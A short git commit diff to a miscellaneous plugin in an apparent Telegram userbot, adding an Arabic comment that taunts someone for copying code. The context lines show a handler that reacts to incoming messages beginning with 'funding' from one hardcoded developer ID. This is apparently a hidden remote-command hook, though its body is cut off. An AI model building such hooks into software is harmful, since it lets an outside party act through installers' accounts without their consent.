eadb0f3b60bf9cc527b5065000b3ef928a064361
السيد <106372829+jepthoniq@users.noreply.github.com>
2023-06-22 16:13:20 +0300

    Update ⁨منوع.py⁩

--- HuRe/plugins/منوع.py
+++ HuRe/plugins/منوع.py
@@ -324,7 +324,7 @@ async def ithker(knopis):
     await knopis.edit(choice(HuRe_Bosa))
 
 DevJoker = [705475246]
-
+#تضل تخمط من عمك الجوكر ؟ الى اين يستمُر الفشل ياغُلام
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
